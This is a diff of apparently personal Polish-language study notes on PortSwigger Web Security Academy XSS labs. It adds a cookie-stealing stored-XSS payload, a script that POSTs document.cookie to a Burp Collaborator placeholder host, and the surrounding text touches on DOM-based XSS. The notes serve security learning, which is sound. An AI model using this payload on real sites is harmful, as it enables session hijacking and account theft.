@@ -230,6 +230,18 @@ https://0a71005c041e3653c08e355d00090032.web-security-academy.net/post?postId=4&
 </script>
 ```
 
+## Lab: Exploiting cross-site scripting to steal cookies
+1. W komentarzu wpisujemy
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
 # DOM BASED XSS 
 
 Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone) 
